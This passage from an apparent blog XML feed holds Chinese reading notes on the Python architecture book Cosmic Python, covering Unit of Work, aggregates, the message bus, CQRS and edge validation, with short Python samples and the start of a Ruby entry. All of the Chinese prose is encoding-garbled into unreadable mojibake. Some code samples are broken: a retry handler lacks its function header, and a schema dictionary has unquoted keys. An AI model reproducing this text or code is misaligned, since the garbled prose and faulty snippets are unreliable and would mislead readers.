æ–°çš„ç‰¹æ€§çš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±ç”¨é«˜é€Ÿæ¡£ï¼Œåœ¨æœåŠ¡å±‚è¿›è¡Œæµ‹è¯•ã€‚</p><p>æ‰€è°“çš„ä¾èµ–å…³ç³»ï¼Œå°±æ˜¯è¦å¼•å…¥å¹¶ä¸”æ‰‹åŠ¨çš„å®ä¾‹åŒ–å¯¹è±¡ã€‚</p><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæ‚¨å‘ç°è‡ªå·±éœ€è¦åœ¨<strong>æœåŠ¡å±‚æµ‹è¯•</strong>ä¸­ç›´æ¥æ‰§è¡ŒåŸŸå±‚çš„å·¥ä½œï¼Œè¿™å¯èƒ½è¡¨æ˜æ‚¨çš„æœåŠ¡å±‚æ˜¯ä¸å®Œæ•´çš„</p></blockquote><p><strong>æ¯ä¸ªæµ‹è¯•å€¾å‘äºè¦†ç›–ä¸€ä¸ªç‰¹æ€§çš„ä¸€ä¸ªä»£ç è·¯å¾„</strong></p><blockquote><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œæ‚¨çš„åº”ç”¨ç¨‹åºçš„ç»“æ„åº”è¯¥ä½¿å¾—æ‰€æœ‰å†’æ³¡åˆ°å…¥å£ç‚¹çš„é”™è¯¯(ä¾‹å¦‚ï¼ŒFlask)éƒ½ä»¥åŒæ ·çš„æ–¹å¼å¤„ç†ã€‚</p></blockquote><p>  ç”¨åŸè¯­è€Œä¸æ˜¯åŸŸå¯¹è±¡æ¥è¡¨ç¤ºæœåŠ¡å±‚ã€‚</p><h2 id="å·¥ä½œå•å…ƒ-Unit-of-Work"><a href="#å·¥ä½œå•å…ƒ-Unit-of-Work" class="headerlink" title="å·¥ä½œå•å…ƒ Unit of Work"></a>å·¥ä½œå•å…ƒ Unit of Work</h2><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/0df1c20f1443178b71459560515c9cf5.png" alt="7.png"></p><p>å·¥ä½œå•å…ƒæ”¾åœ¨æœåŠ¡å±‚ï¼Œè§£å†³çš„é—®é¢˜æ˜¯åœ¨<code>Services</code>ä¸­ç›´æ¥è°ƒç”¨ä»“åº“è¿˜æ˜¯è€¦åˆåº¦è¾ƒé«˜ï¼Œå¹¶ä¸”ä¸æ˜“äºå¯¹DBè¿›è¡Œç»´æŠ¤ã€‚</p><p>ä½¿ç”¨äº†UoWåï¼Œå¯ä»¥é€šè¿‡<code>with uow</code>çš„æ–¹å¼å¯¹ä¸Šä¸‹æ–‡è¿›è¡Œå¤„ç†ã€‚<code>__enter</code>å’Œ<code>__exit__</code>æ–¹æ³•</p><p>å¦å¤–ï¼Œå°†åŸæœ¬åœ¨serverä¸Šä¾èµ–çš„<code>Repository</code>è½¬ç§»åˆ°äº†UoWä¸Šï¼ŒServeråªéœ€è¦è·å¾—UoWå°±å¯ä»¥äº†ã€‚</p><p>UoWè¿˜èƒ½æä¾›é‡åˆ°å¼‚å¸¸æ—¶å€™çš„éšå¼å¤„ç†æ¨¡å¼ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractUnitOfWork</span>(<span class="hljs-params">abc.ABC</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> self</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, exc_type, exc_value, traceback</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> exc_type <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">            self.commit()  <span class="hljs-comment">#(1)</span></span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            self.rollback()  <span class="hljs-comment">#(2)</span></span></code></pre></div></div><h2 id="èšåˆå’Œä¸€è‡´æ€§è¾¹ç•Œ"><a href="#èšåˆå’Œä¸€è‡´æ€§è¾¹ç•Œ" class="headerlink" title="èšåˆå’Œä¸€è‡´æ€§è¾¹ç•Œ"></a>èšåˆå’Œä¸€è‡´æ€§è¾¹ç•Œ</h2><blockquote><p>äº‹å®ä¸Šï¼Œå¤§é‡çš„ä¸šåŠ¡æµç¨‹éƒ½æ˜¯é€šè¿‡ç”µå­é‚®ä»¶æ‰‹å·¥æ¥å›å‘é€ç”µå­è¡¨æ ¼æ¥å®ç°çš„ã€‚è¿™ç§â€œ CSV over SMTPâ€ä½“ç³»ç»“æ„çš„åˆå§‹å¤æ‚åº¦è¾ƒä½ï¼Œä½†ç”±äºéš¾ä»¥åº”ç”¨é€»è¾‘å’Œç»´æŠ¤ä¸€è‡´æ€§ï¼Œå› æ­¤å¾€å¾€ä¸èƒ½å¾ˆå¥½åœ°è¿›è¡Œä¼¸ç¼©ã€‚</p></blockquote><p>èšåˆã€æœ‰ç•Œä¸Šä¸‹æ–‡å’Œå¾®æœåŠ¡</p><blockquote><p>ä»æœ¬è´¨ä¸Šè®²ï¼Œè¿™æ˜¯å¯¹è¯•å›¾å°†æ•´ä¸ªä¼ä¸šçº³å…¥å•ä¸€æ¨¡å¼çš„åå‡»ã€‚é¡¾å®¢è¿™ä¸ªè¯å¯¹äºé”€å”®ã€å®¢æˆ·æœåŠ¡ã€åå‹¤ã€æ”¯æŒç­‰ç­‰æ–¹é¢çš„äººæ¥è¯´æ„å‘³ç€ä¸åŒçš„ä¸œè¥¿ã€‚åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­éœ€è¦çš„å±æ€§åœ¨å¦ä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­æ˜¯ä¸ç›¸å…³çš„; æ›´æœ‰å®³çš„æ˜¯ï¼ŒåŒåçš„æ¦‚å¿µåœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­å¯èƒ½æœ‰å®Œå…¨ä¸åŒçš„å«ä¹‰ã€‚ä¸å…¶è¯•å›¾æ„å»ºä¸€ä¸ªå•ä¸€çš„æ¨¡å‹(æˆ–ç±»æˆ–æ•°æ®åº“)æ¥æ•è·æ‰€æœ‰çš„ç”¨ä¾‹ï¼Œä¸å¦‚ä½¿ç”¨å¤šä¸ªæ¨¡å‹ï¼Œå›´ç»•æ¯ä¸ªä¸Šä¸‹æ–‡åˆ’å®šç•Œé™ï¼Œå¹¶æ˜ç¡®åœ°å¤„ç†ä¸åŒä¸Šä¸‹æ–‡ä¹‹é—´çš„è½¬æ¢ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯æ‰€ï¼Œé€šè¿‡å¯¹ä¸Šä¸‹æ–‡çš„é™åˆ¶ï¼Œç¡®å®šæ¯ä¸€ä¸ªèšåˆçš„æœåŠ¡å¯¹è±¡ç¡®ä¿æ˜¯æœ€å°å•å…ƒçš„,åŸŸæ¨¡å‹åº”è¯¥åªåŒ…å«æ‰§è¡Œè®¡ç®—æ‰€éœ€çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼š</p><p><code>Product(sku, batches)</code> å’Œ <code>Product(sku, description, price, image_url, dimensions, etcâ€¦â€‹)</code></p><p>èšåˆæ˜¯è¿›å…¥åŸŸæ¨¡å‹çš„å…¥å£ç‚¹</p><p>èšåˆçš„ä»»åŠ¡æ˜¯èƒ½å¤Ÿåœ¨ä¸å˜é‡åº”ç”¨äºä¸€ç»„ç›¸å…³å¯¹è±¡æ—¶ç®¡ç†æœ‰å…³ä¸å˜é‡çš„ä¸šåŠ¡è§„åˆ™ã€‚æ£€æŸ¥å…¶èŒæƒèŒƒå›´å†…çš„å¯¹è±¡æ˜¯å¦ç›¸äº’ä¸€è‡´ï¼Œæ˜¯å¦ç¬¦åˆæˆ‘ä»¬çš„è§„åˆ™ï¼Œå¹¶æ‹’ç»å¯èƒ½è¿åè§„åˆ™çš„æ›´æ”¹ï¼Œè¿™æ˜¯æ€»ä½“çš„å·¥ä½œã€‚</p><h2 id="äº‹ä»¶å’Œæ¶ˆæ¯æ€»çº¿"><a href="#äº‹ä»¶å’Œæ¶ˆæ¯æ€»çº¿" class="headerlink" title="äº‹ä»¶å’Œæ¶ˆæ¯æ€»çº¿"></a>äº‹ä»¶å’Œæ¶ˆæ¯æ€»çº¿</h2><p>ä¸¾ä¾‹ï¼šå½“éœ€è¦ä½¿ç”¨<code>send_mail</code>æ¥é€šå‘Šçš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•æ”¾åœ¨å“ªé‡Œå‘¢ï¼Ÿ å¯ä»¥æƒ³åˆ°æ”¾åœ¨ç°æœ‰çš„å“ªä¸ªä½ç½®éƒ½æ˜¯ä¸å¥½çš„ï¼Œå› ä¸ºè¿åäº†å•ä¸€è´£ä»»åŸåˆ™ã€‚</p><p>æˆ‘ä»¬çš„æ¨¡å‹ä¸ä¼šå…³æ³¨ç”µå­é‚®ä»¶ï¼Œè€Œæ˜¯è´Ÿè´£è®°å½•äº‹ä»¶ã€‚æˆ‘ä»¬å°†ä½¿ç”¨æ¶ˆæ¯æ€»çº¿æ¥å“åº”äº‹ä»¶å¹¶è°ƒç”¨æ–°çš„æ“ä½œã€‚</p><p>messagebuså±äºæœåŠ¡å±‚ã€‚</p><p>å…·ä½“çš„æ“ä½œå°±æ˜¯åœ¨<code>repository</code>ä¸­æ·»åŠ è¦è§‚å¯Ÿçš„ç±»ï¼Œç„¶ååœ¨<code>uow</code>è¦<code>commit</code>çš„æ—¶å€™å°†æ‰€æœ‰çš„eventä¼ é€’ç»™messagebus</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle</span>(<span class="hljs-params">event: events.Event</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> handler <span class="hljs-keyword">in</span> HANDLERS[<span class="hljs-built_in">type</span>(event)]:</span><span class="line">        handler(event)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_out_of_stock_notification</span>(<span class="hljs-params">event: events.OutOfStock</span>):</span></span><span class="line">    email.send_mail(</span><span class="line">        <span class="hljs-string">&quot;stock@made.com&quot;</span>,</span><span class="line">        <span class="hljs-string">f&quot;Out of stock for <span class="hljs-subst">&#123;event.sku&#125;</span>&quot;</span>,</span><span class="line">    )</span><span class="line"></br></span><span class="line"></br></span><span class="line">HANDLERS = &#123;</span><span class="line">    events.OutOfStock: [send_out_of_stock_notification],</span><span class="line">&#125;  <span class="hljs-comment"># type: <span class="hljs-type">Dict</span>[<span class="hljs-type">Type</span>[events.Event], <span class="hljs-type">List</span>[<span class="hljs-type">Callable</span>]]</span></span></code></pre></div></div><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/a411fa45e57f664059c29e99e529475a.png" alt="9.png"></p><h2 id="Going-to-Towm-on-the-Message-Bus"><a href="#Going-to-Towm-on-the-Message-Bus" class="headerlink" title="Going to Towm on the Message Bus"></a>Going to Towm on the Message Bus</h2><p>è¿™ä¸€ç« å°†APIè°ƒç”¨å’Œå†…éƒ¨æ¶ˆæ¯éƒ½ç»Ÿä¸€èµ·æ¥äº†æ”¾åœ¨äº†å‰ç«¯ã€‚æ‰€æœ‰APIçš„è°ƒç”¨éƒ½æ˜¯ä»¥æ¶ˆæ¯çš„æ–¹å¼è¿›è¡Œçš„ã€‚</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/ddfee420274300570723a328cc8e46dc.png" alt="10.png"></p><p>è¿™æ ·åšä¹Ÿå¯¼è‡´äº†æ•´ä¸ªä¸²è”å…³ç³»æ²¡æœ‰äº†å®ä½“ï¼Œåªèƒ½é€šè¿‡æ—¥å¿—æ¥è¿›è¡Œè°ƒè¯•ã€‚</p><p>ä¸‹å›¾æ˜¯æ—¶åºå›¾ï¼Œåœ¨è°ƒç”¨äº†BatchQuantityChangedäº‹ä»¶åï¼Œåœ¨<code>messagebus.py</code>ä¸­å°†æ¶ˆæ¯è½¬åŒ–æˆäº†å‡½æ•°è°ƒç”¨ï¼Œå»æ‰§è¡Œ<code>domain</code>ä¸­çš„å†…å®¹ï¼Œç„¶å<code>domain</code>åˆæ¿€å‘äº†<code>AllocationRequired</code>æ¶ˆæ¯ï¼Œ<code>handler</code>æ¥å—åˆ°äº†åç»§ç»­æ‰§è¡Œã€‚</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/6eeb52e368a4a9e5d0268125d81637e5.png" alt="11.png"></p><p>å¦å¤–åœ¨åšæµ‹è¯•çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>FakeMessageBus</code>æ¥è¿›è¡Œã€‚</p><h2 id="å‘½ä»¤å’Œå‘½ä»¤å¤„ç†ç¨‹åº"><a href="#å‘½ä»¤å’Œå‘½ä»¤å¤„ç†ç¨‹åº" class="headerlink" title="å‘½ä»¤å’Œå‘½ä»¤å¤„ç†ç¨‹åº"></a>å‘½ä»¤å’Œå‘½ä»¤å¤„ç†ç¨‹åº</h2><p>å°†<code>Event</code>å’Œ<code>Command</code>åˆ†å¼€</p><p>Eventï¼š</p><ol><li>äº‹ä»¶ä¼ é€’ç»™å¯ä»¥å§”æ‰˜ç»™æ¯ä¸ªäº‹ä»¶çš„å¤šä¸ªå¤„ç†ç¨‹åºçš„è°ƒåº¦ç¨‹åºã€‚</li><li>å®ƒæ•è·å¹¶è®°å½•é”™è¯¯ï¼Œä½†ä¸å…è®¸é”™è¯¯ä¸­æ–­æ¶ˆæ¯å¤„ç†ã€‚</li><li>æ²¡æœ‰è¿”å›å€¼</li></ol><p>Commandï¼š</p><ol><li> å‘½ä»¤è°ƒåº¦ç¨‹åºæœŸæœ›æ¯ä¸ªå‘½ä»¤åªæœ‰ä¸€ä¸ªå¤„ç†ç¨‹åºã€‚</li><li> å¦‚æœå‡ºç°ä»»ä½•é”™è¯¯ï¼Œå®ƒä»¬å¾ˆå¿«å°±ä¼šå¤±è´¥ï¼Œå¹¶ä¸”ä¼šå†’å‡ºæ¥ã€‚</li></ol><p>Event å‘½åæ˜¯è¿‡å»æ—¶ï¼Œè€ŒCommandæ˜¯ç°åœ¨æ—¶ã€‚</p><p>åŒºåˆ«å¯¹å¾…Eventå’ŒCommandæœ‰åŠ©äºå¸®åŠ©æˆ‘ä»¬ç†è§£å“ªäº›äº‹æ˜¯å¿…é¡»æˆåŠŸçš„ï¼Œå“ªäº›æ˜¯å¯ä»¥å¤±è´¥çš„ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> tenacity <span class="hljs-keyword">import</span> Retrying, RetryError, stop_after_attempt, wait_exponential <span class="hljs-comment">#(1)</span></span><span class="line"></br></span><span class="line">...</span><span class="line"></br></span><span class="line"></br></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    event: events.Event,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    queue: <span class="hljs-type">List</span>[Message],</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    uow: unit_of_work.AbstractUnitOfWork,</span></span></span><span class="line"></br>):</span></span><span class="line">    <span class="hljs-keyword">for</span> handler <span class="hljs-keyword">in</span> EVENT_HANDLERS[<span class="hljs-built_in">type</span>(event)]:</span><span class="line">        <span class="hljs-keyword">try</span>:</span><span class="line">            <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> Retrying(  <span class="hljs-comment">#(2)</span></span><span class="line">                stop=stop_after_attempt(<span class="hljs-number">3</span>),</span><span class="line">                wait=wait_exponential()</span><span class="line">            ):</span><span class="line"></br></span><span class="line">                <span class="hljs-keyword">with</span> attempt:</span><span class="line">                    logger.debug(<span class="hljs-string">&quot;handling event %s with handler %s&quot;</span>, event, handler)</span><span class="line">                    handler(event, uow=uow)</span><span class="line">                    queue.extend(uow.collect_new_events())</span><span class="line">        <span class="hljs-keyword">except</span> RetryError <span class="hljs-keyword">as</span> retry_failure:</span><span class="line">            logger.error(</span><span class="line">                <span class="hljs-string">&quot;Failed to handle event %s times, giving up!&quot;</span>,</span><span class="line">                retry_failure.last_attempt.attempt_number</span><span class="line">            )</span><span class="line">            <span class="hljs-keyword">continue</span></span></code></pre></div></div><p>ä¸Šé¢çš„é‡è¯•æ–¹æ³•ä½¿eventæœ‰ä¸€å®šçš„éŸ§æ€§ã€‚</p><h2 id="Event-Driven-æ¶æ„"><a href="#Event-Driven-æ¶æ„" class="headerlink" title="Event-Driven æ¶æ„"></a>Event-Driven æ¶æ„</h2><p>äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œå½“é‡åˆ°éœ€è¦ä¸å…¶ä»–è½¯ä»¶ç³»ç»Ÿè¿›è¡Œåä½œçš„æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨è½¯ä»¶çš„æ–¹æ³•ç›¸å½“äºæ˜¯å¼ºè€¦åˆäº†ï¼Œè¿™é‡Œç»™å‡ºçš„æ–¹å¼æ˜¯é€šè¿‡å¼‚æ­¥æ¶ˆæ¯æ¥ä¸²è”ï¼Œä½¿ç”¨çš„å·¥å…·æ˜¯<code>Redis</code></p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/663a2c676ac004f27f9c8078fa5505cb.png" alt="12.png"></p><h2 id="å‘½ä»¤æŸ¥è¯¢è´£ä»»åˆ†ç¦»ï¼ˆCQRSï¼‰"><a href="#å‘½ä»¤æŸ¥è¯¢è´£ä»»åˆ†ç¦»ï¼ˆCQRSï¼‰" class="headerlink" title="å‘½ä»¤æŸ¥è¯¢è´£ä»»åˆ†ç¦»ï¼ˆCQRSï¼‰"></a>å‘½ä»¤æŸ¥è¯¢è´£ä»»åˆ†ç¦»ï¼ˆCQRSï¼‰</h2><p>command-query Responsibility separation (CQRS) </p><p>å°†å‘½ä»¤ä¸æŸ¥è¯¢çš„è´£ä»»åˆ†å¼€ã€‚</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/22030bbf641c076f4d70371302493317.png" alt="13.png"></p><p>å•ç‹¬å¼€è¾Ÿä¸€ä¸ª<code>view.py</code>å±‚ä½œä¸ºå¯¹å¤–çš„è¯»å–æ¥å£ï¼Œå¹¶ç›´æ¥è°ƒç”¨SQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ˜¯<code>allocations_view</code>è¡¨ã€‚</p><p>ä¹¦ä¸­åŠ å…¥äº†<code>event.Allocated</code>äº‹ä»¶æ–¹æ³•<code>handlers.add_allocation_to_read_model</code>ï¼Œå°†å•ç‹¬çš„ç»™DBä¸­<code>allocations_view</code>è¡¨æ·»åŠ å¯è¯»ä¿¡æ¯ã€‚è¿™æ ·å°†å¤–éƒ¨çš„å¯è¯»ä¸å¯å†™çš„åˆ†å¼€äº†ã€‚</p><h2 id="æ³¨å…¥ä¾èµ–"><a href="#æ³¨å…¥ä¾èµ–" class="headerlink" title="æ³¨å…¥ä¾èµ–"></a>æ³¨å…¥ä¾èµ–</h2><p>æ‰€è°“çš„æ³¨å…¥ä¾èµ–ï¼Œå°±æ˜¯å°†åŸæœ¬åœ¨æ–¹æ³•å†…å®Œæˆçš„å®ä¾‹åŒ–ç”±ç¬¬ä¸‰æ–¹å¤–éƒ¨å®Œæˆï¼Œç„¶åä¼ é€’è¿›æ¥çš„å°±åªæ˜¯å®ä¾‹å³å¯ã€‚</p><p>åŸå…ˆçš„MessageBuséœ€è¦åœ¨å†…éƒ¨è¿›è¡Œç»„è£…ï¼Œè€Œè¿™ç« åŠ å…¥äº†å¼•å¯¼æ¨¡å—(bootstrap)ã€‚å¹¶åœ¨å…¶ä¸­è¿›è¡Œç»„è£…ï¼Œä½¿ç”¨lambdaå‡½æ•°å°†å‡½æ•°é¢„å…ˆå°è£…å¥½ã€‚åé¢ç›´æ¥è°ƒç”¨ï¼Œè€Œä¸ç”¨è·å–<code>uow</code>ç­‰ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚</p><p>åŠ å…¥äº†å¼•å¯¼æ¨¡å—çš„å¥½å¤„æ˜¯å¯ä»¥æ ¹æ®å®é™…çš„æƒ…å†µè¿›è¡Œæ‹¼è£…ï¼Œæ¯”å¦‚æµ‹è¯•è¿˜æ˜¯ç”Ÿäº§ã€‚</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/08c051419609a2a668e0183d4f194abf.png" alt="14.png"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><blockquote><p>åœ¨æœ¬ä¹¦çš„å¼€å¤´ï¼Œæˆ‘ä»¬è¯´è¿‡ä¸€ä¸ªå¤§æ³¥çƒçš„ä¸»è¦ç‰¹å¾æ˜¯åŒè´¨æ€§: ç³»ç»Ÿçš„æ¯ä¸ªéƒ¨åˆ†çœ‹èµ·æ¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºæˆ‘ä»¬<strong>æ²¡æœ‰æ˜ç¡®æ¯ä¸ªéƒ¨åˆ†çš„è´£ä»»</strong>ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å¼€å§‹åˆ’åˆ†è´£ä»»å¹¶å¼•å…¥æ˜ç¡®çš„ç•Œé™ã€‚æˆ‘ä»¬å¯ä»¥åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…æ˜¯å¼€å§‹æ„å»ºæœåŠ¡å±‚(åä½œç³»ç»Ÿçš„é¢†åŸŸ)ã€‚</p></blockquote><blockquote><p>å‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œæˆ‘ä»¬å¸Œæœ›<strong>é¿å…ä»£ç ä¸­æ··æ‚æ— å…³çš„ç»†èŠ‚</strong>ã€‚ç‰¹åˆ«æ˜¯ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›åœ¨åŸŸæ¨¡å‹ä¸­è¿›è¡Œé˜²å¾¡æ€§ç¼–ç ã€‚ç›¸åï¼Œæˆ‘ä»¬å¸Œæœ›ç¡®ä¿åœ¨åŸŸæ¨¡å‹æˆ–ç”¨ä¾‹å¤„ç†ç¨‹åºçœ‹åˆ°è¯·æ±‚ä¹‹å‰ï¼Œè¯·æ±‚å·²çŸ¥æ˜¯æœ‰æ•ˆçš„ã€‚è¿™æœ‰åŠ©äºæˆ‘ä»¬çš„ä»£ç åœ¨é•¿æœŸå†…ä¿æŒæ•´æ´å’Œå¯ç»´æŠ¤æ€§ã€‚æˆ‘ä»¬æœ‰æ—¶å°†æ­¤ç§°ä¸ºåœ¨ç³»ç»Ÿè¾¹ç¼˜éªŒè¯ã€‚</p></blockquote><p>éªŒè¯æ˜¯éªŒè¯ä»€ä¹ˆï¼Ÿå¥æ³•ã€è¯­ä¹‰å’Œè¯­ç”¨ï¼ˆsyntax, semantics, and pragmaticsï¼‰ã€‚</p><p>åœ¨ç³»ç»Ÿè¾¹ç¼˜è¿›è¡ŒéªŒè¯ã€‚</p><h3 id="è¯­æ³•çš„éªŒè¯"><a href="#è¯­æ³•çš„éªŒè¯" class="headerlink" title="è¯­æ³•çš„éªŒè¯"></a>è¯­æ³•çš„éªŒè¯</h3><p>é€šè¿‡<code>schema</code>æ¨¡å—å¯¹<code>command.py</code>æ¨¡å—ä¸­çš„dataclassè¿›è¡ŒéªŒè¯ã€‚</p><p>è¿™æ ·å°±å¯ä»¥ä¿è¯åœ¨apiå’Œä¸šåŠ¡æ ¸å¿ƒä¸Šçš„ä»£ç å¹²å‡€ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> schema <span class="hljs-keyword">import</span> And, Schema, Use</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@dataclass</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Allocate</span>(<span class="hljs-params">Command</span>):</span></span><span class="line"></br></span><span class="line">    _schema = Schema(&#123;  <span class="hljs-comment">#(1)</span></span><span class="line">        <span class="hljs-string">&#x27;orderid&#x27;</span>: <span class="hljs-built_in">int</span>,</span><span class="line">         sku: <span class="hljs-built_in">str</span>,</span><span class="line">         qty: And(Use(<span class="hljs-built_in">int</span>), <span class="hljs-keyword">lambda</span> n: n &gt; <span class="hljs-number">0</span>)</span><span class="line">     &#125;, ignore_extra_keys=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line">    orderid: <span class="hljs-built_in">str</span></span><span class="line">    sku: <span class="hljs-built_in">str</span></span><span class="line">    qty: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @classmethod</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_json</span>(<span class="hljs-params">cls, data</span>):</span>  <span class="hljs-comment">#(2)</span></span><span class="line">       data = json.loads(data)</span><span class="line">       <span class="hljs-keyword">return</span> cls(**_schema.validate(data))</span></code></pre></div></div><p>è¿™æ ·åšæœ‰ä¸ªå¼Šç«¯å°±æ˜¯è¦å£°æ˜ä¸¤æ¬¡ã€‚</p><h3 id="è¯­ä¹‰éªŒè¯"><a href="#è¯­ä¹‰éªŒè¯" class="headerlink" title="è¯­ä¹‰éªŒè¯"></a>è¯­ä¹‰éªŒè¯</h3><p>å°†è§„åˆ™éªŒè¯å•ç‹¬æå–å‡ºæ¥ï¼Œå¼€è¾Ÿå•ç‹¬çš„Exceptionï¼Œå¹¶åœ¨MessageBusä¸­æ•è·</p><h3 id="è¯­ç”¨"><a href="#è¯­ç”¨" class="headerlink" title="è¯­ç”¨"></a>è¯­ç”¨</h3><p>è¯­ç”¨å°±æ˜¯ç»“åˆä¸Šä¸‹æ–‡ï¼Œä¹¦ä¸­æ²¡æœ‰ç»™å‡ºç¤ºä¾‹ã€‚</p><blockquote><p> <strong>éªŒè¯è¯­æ³•å¯ä»¥å‘ç”Ÿåœ¨æ¶ˆæ¯ç±»ä¸Šï¼ŒéªŒè¯è¯­ä¹‰å¯ä»¥å‘ç”Ÿåœ¨æœåŠ¡å±‚æˆ–æ¶ˆæ¯æ€»çº¿ä¸Šï¼ŒéªŒè¯è¯­ç”¨å±äºåŸŸæ¨¡å‹ã€‚</strong></p></blockquote><p>å…¨ä¹¦çš„æœ€ç»ˆç»“æ„ï¼š</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/e34b6be92adfc2b86ffebbb26e802463.png" alt="15.png"></p><p><img src="http://121.196.175.55:9999/png/RLDBJiCm4Dtx5AEke58v0AeGAQq44eX2LRf8A-GaGmbDxCXsIYleZbjm3pQLE0s8Q-1FaXfHRsBFl9bvysPoAXKLgimp-Dc-VMq_ljy_YKfLXj1kDvPscv22nWiwHsYDK2pJ62_f6aKBNWZe4rwXbDhRA-KCg8IebDQklz0vWV2SiYH38MVM6lEyu0oPWjQOfGhu0qouMDJ9RC8WaahGMC6OJsnA6fNykV7R5tHVZo0StLm65cMT6yUdAMZAkz0D8M4mlD0MRJB4Zk6Cvxa6IX8EbffEp9aiSnHx8LvmsEDS6Nh5R6_a7__kNcSbdfX1GWkbUTQzUzBSOi5bghX8KUwNfa6iAuM4DdWIcQUdaGVtfRh599LJPlkOic4PPQbyDAtebCBu70nLF3CQEkKxLbPRRpS0r_o_MbwxVPxJb3LR4ypd0kTKeHrJE61wyofozSFblADPYN0TFM6iQh_XMzsh8Lb-jQ8ceoj7I48LZQZ4gkx18VHxTXy6AmrbD8DgVw4d-ABg7LVtkREItTNH-JjptztjT2hHo3yXRAmkhCyfiaJ_Sxy0" alt="ç»„ä»¶å›¾" title="ç»„ä»¶å›¾"></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ruby ä¸­ include extend require load çš„åŒºåˆ«</title>
      <link href="/2021/10/09/ruby-%E4%B8%AD-include-extend-require-load-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2021/10/09/ruby-%E4%B8%AD-include-extend-require-load-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
